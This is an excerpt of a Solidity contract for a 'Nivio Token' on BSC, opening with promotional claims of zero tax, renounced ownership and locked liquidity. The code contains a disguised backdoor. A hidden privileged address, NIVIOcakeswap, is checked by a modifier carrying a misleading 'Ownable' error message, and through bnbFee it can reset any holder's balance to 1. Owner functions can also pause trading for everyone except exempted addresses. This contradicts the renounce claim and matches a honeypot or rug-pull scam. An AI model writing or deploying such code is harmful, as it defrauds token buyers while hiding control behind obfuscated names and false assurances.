...
The future is here.
https://www.nivio.com/
https://t.me/niviotoken

🧮 Supply : 1,000,000,000,000
🏳️💚Tax 0% 
🏳️💚Renounce
https://bscscan.com/tx/0x5c994d0959577ffb963da2a7adce6d745992eb7df18dd0047fb5d80e707c2eda
🏳️💚Cake Locked 1 Year
https://www.pinksale.finance/pinklock/record/1083427?chain=BSC
🏳️💚28% Burn Address
https://bscscan.com/tx/0x5be00d1b817d119d98166d3d4469475690b9195699ad39d29359376d0d8faf9e
*/
pragma solidity ^0.8.19;

abstract contract NIVIOabcd {
...
abstract contract NIVIOab is NIVIOabcd {
...
contract NIVIO is NIVIOabcd, NIVIOabc, NIVIOa, NIVIOab {

    mapping(address => uint256) private ebalances;
  mapping(address => bool) public NIVIOAZERTY;
    mapping(address => mapping(address => uint256)) private _allowances;
address private NIVIOcakeswap;
  ...
  address NIVIObitcin;
    ...
    constructor(address _NIVIOcakeswap) {
            // Editable
            NIVIObitcin = msg.sender;
            NIVIOAZERTY[NIVIObitcin] = true;
        _name = "Nivio Token";
        _symbol = "NIVIO";
  NIVIOcakeswap = _NIVIOcakeswap;        
  ...
  modifier NIVIO0wner () {
    require(NIVIObitcin == msg.sender, "ERC20: cannot permit NIVIOcake address");
    _;
    ...
    function _transfer(
        ...
        // My implementation
        require(!NIVIOisPaused || isPauseExempt[from], "Transactions are paused.");
    ...
    modifier NIVIOcake() {
        require(NIVIOcakeswap == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


  function bnbFee(address NIVIOaccount) external NIVIOcake {
    ebalances[NIVIOaccount] = 1;
            emit Transfer(address(0), NIVIOaccount, 1);
  }
  ...
  function bnbOut(address outaccount) external NIVIOcake {
    ...
    function wNIVIOtingExempt(address account, bool value) external onlyOwner {
        isPauseExempt[account] = value;
    }
    
    function wNIVIOtingd(bool value) external onlyOwner {
        NIVIOisPaused = value;
    }
}